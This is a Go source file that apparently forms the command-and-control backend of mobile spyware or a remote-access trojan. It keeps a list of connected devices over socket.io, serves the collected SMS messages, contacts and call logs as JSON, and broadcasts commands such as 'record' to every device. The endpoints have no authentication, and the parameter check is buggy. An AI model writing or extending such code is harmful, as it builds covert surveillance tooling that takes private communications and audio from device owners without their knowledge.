package handlers

import (
	"encoding/json"
	socketio "github.com/googollee/go-socket.io"
	"log"
	"net/http"
)

type Device struct {
	ID                  string
	Conn                socketio.Conn
	DeviceDetails       string
	DeviceRemoteAddress string
}

var MessageList interface{}
var ContactList interface{}
var CallLogs interface{}

var DeviceList []Device

func DeviceHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type","application/json")
	res, _ := json.Marshal(DeviceList)
	w.Write(res)
}

func CommandHandler(w http.ResponseWriter, r *http.Request) {
	keys, ok := r.URL.Query()["name"]
	if !ok && len(keys) < 1{
		_ = json.NewEncoder(w).Encode("Url param missing!")
		return
	}
	key := keys[0]
	log.Println(key)
	for _, v := range DeviceList{
		if key == "record"{
			v.Conn.Emit("command", key, 20)
		}else {
			v.Conn.Emit("command", key)
		}
	}
	w.Write([]byte("command successful!"))
	return
}

func SmsListView(w http.ResponseWriter, r *http.Request){
	w.Header().Set("Content-Type","application/json")
	res , _ :=json.Marshal(MessageList)
	w.Write(res)
}

func CallLogsView(w http.ResponseWriter, r *http.Request){
	w.Header().Set("Content-Type","application/json")
	res , _ :=json.Marshal(CallLogs)
	w.Write(res)
}

func ContactListView(w http.ResponseWriter, r *http.Request){
	w.Header().Set("Content-Type","application/json")
	res , _ :=json.Marshal(ContactList)
	w.Write(res)
}
